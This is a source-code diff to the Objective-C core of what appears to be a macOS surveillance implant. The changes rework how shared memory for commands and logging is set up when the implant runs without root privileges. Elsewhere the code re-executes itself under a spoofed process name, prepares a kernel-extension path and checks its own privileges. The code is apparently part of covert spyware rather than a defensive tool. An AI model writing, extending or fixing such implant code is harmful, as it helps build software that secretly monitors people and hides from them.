@@ -268,8 +268,8 @@ static void computerWillShutdown(CFMachPortRef port,
   // Executing ourself with the new executable name and exit
   //
   [gUtil executeTask: mSpoofedName
-        withArguments: nil
-         waitUntilEnd: NO];
+       withArguments: nil
+        waitUntilEnd: NO];
   
   exit(0);
 }
@@ -328,39 +328,6 @@ static void computerWillShutdown(CFMachPortRef port,
   
   return -1;
 }
-
-#if 0
-- (int)_removeAdvisoryLock: (NSString *)aLockFile
-{
-  NSError *error;
-  
-  if (flock([self mLockFD], LOCK_UN) != 0)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error while removing advisory lock");
-#endif
-      return -1;
-    }
-  else
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Advisory lock removed correctly");
-#endif
-      BOOL success = [[NSFileManager defaultManager] removeItemAtPath: aLockFile
-                                                                error: &error];
-      
-      if (success == NO)
-        {
-#ifdef DEBUG_CORE
-          errorLog(@"Error while deleting lock file");
-#endif
-          return -1;
-        }
-    }
-  
-  return 0;
-}
-#endif
 
 - (void)_checkSystemLog
 {
@@ -1547,6 +1514,9 @@ static void computerWillShutdown(CFMachPortRef port,
     }
   else // Antani
     {
+#ifdef DEBUG_CORE
+      infoLog(@"Going with NO PRIVS");
+#endif
       NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
                             [[[[[NSBundle mainBundle] bundlePath]
                                stringByDeletingLastPathComponent]
@@ -2228,17 +2198,6 @@ static void computerWillShutdown(CFMachPortRef port,
                                stringByDeletingLastPathComponent] 
                                stringByAppendingPathComponent: @"System Preferences"]];
       
-      // init shared memory
-      key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
-      key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
-      
-      gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
-                                                              size: SHMEM_COMMAND_MAX_SIZE
-                                                     semaphoreName: SHMEM_SEM_NAME];
-      gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
-                                                              size: SHMEM_LOG_MAX_SIZE
-                                                     semaphoreName: SHMEM_SEM_NAME];
-      
       // Let's guess all the required names
       [self _guessNames];
       NSString *kextPath    = [[NSString alloc] initWithFormat:
@@ -2341,17 +2300,44 @@ static void computerWillShutdown(CFMachPortRef port,
                                                     bugFix: &gOSBugFix];
   
   [self _checkCurrentPrivsAndDoWhatYouWant];
+
+  key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
+  key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
   
   //
-  // XXX: With low privs we won't have shared memory in this way
-  // which might be right since we won't have external agents
+  // With low privs we will have a very small shared memory
+  // in order to keep everything working as expected
+  // shmem won't be used at all
   //
-  if (getuid() != 0 && geteuid == 0)
+  if (getuid() != 0 && geteuid != 0)
     {
-      if ([self _createAndInitSharedMemory] == NO)
-        return NO;
+#ifdef DEBUG_CORE
+      warnLog(@"Low Privs mode, small shared memory");
+#endif
+
+      //
+      // Give a smaller size since we don't have privileges
+      // for executing sysctl
+      //
+      gMemLogMaxSize = 0x7a440;
     }
+
+  // init shared memory
+  gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
+                                                          size: gMemCommandMaxSize
+                                                 semaphoreName: SHMEM_SEM_NAME];
+  gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
+                                                          size: gMemLogMaxSize
+                                                 semaphoreName: SHMEM_SEM_NAME];
   
+  if ([self _createAndInitSharedMemory] == NO)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error while creating shared memory");
+#endif
+      return NO;
+    }
+
   [self _checkIfIamHighlander];
   
   //
